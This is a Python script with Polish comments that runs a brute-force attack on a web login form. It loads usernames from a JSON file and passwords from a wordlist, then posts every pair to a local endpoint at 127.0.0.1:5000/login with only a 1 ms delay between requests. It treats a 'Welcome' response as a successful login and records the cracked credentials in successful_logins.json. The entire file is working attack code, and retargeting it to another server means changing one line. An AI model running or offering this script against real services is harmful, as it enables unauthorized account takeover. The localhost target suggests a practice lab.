import requests
import json
import time

# URL aplikacji
url = "http://127.0.0.1:5000/login"

# Nagłówki żądań HTTP
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Pliki wejściowe
input_users_file = "responses.json"
input_passwords_file = "password-list.txt"

# Pliki wyjściowe
output_all_attempts_file = "bruteforce_results.json"
output_success_file = "successful_logins.json"

# Wczytanie loginów użytkowników
with open(input_users_file, "r") as file:
    users_data = json.load(file)

users = [entry["user"] for entry in users_data if "user" in entry]

# Wczytanie haseł
with open(input_passwords_file, "r") as file:
    passwords = [line.strip() for line in file]

# Inicjalizacja wyników
all_attempts = []
successful_logins = []

# Inicjalizacja sesji
session = requests.Session()

try:
    # Próba logowania dla każdej kombinacji loginu i hasła
    for user in users:
        for password in passwords:
            payload = f"login={user}&password={password}"
            try:
                response = session.post(url, headers=headers, data=payload)
                status = "success" if "Welcome" in response.text else "failed"  # Dostosuj do odpowiedzi aplikacji
                attempt = {"user": user, "password": password, "status": status}
                all_attempts.append(attempt)
                if status == "success":
                    print(f"Udało się zalogować: {user}:{password}")
                    successful_logins.append(attempt)
                    break  # Zatrzymaj próby dla tego użytkownika, jeśli logowanie się powiedzie
                else:
                    print(f"Nieudana próba: {user}:{password}")
            except Exception as e:
                attempt = {"user": user, "password": password, "status": "error", "error": str(e)}
                all_attempts.append(attempt)
                print(f"Błąd dla {user}:{password} - {str(e)}")
            time.sleep(0.001)  # Opóźnienie między żądaniami
finally:
    session.close()

# Zapisanie wszystkich prób do pliku JSON
with open(output_all_attempts_file, "w") as file:
    json.dump(all_attempts, file, indent=4)

# Zapisanie udanych logowań do osobnego pliku JSON
with open(output_success_file, "w") as file:
    json.dump(successful_logins, file, indent=4)

print(f"Atak brute force zakończony. Wyniki prób zapisano w pliku {output_all_attempts_file}.")
print(f"Udane logowania zapisano w pliku {output_success_file}.")
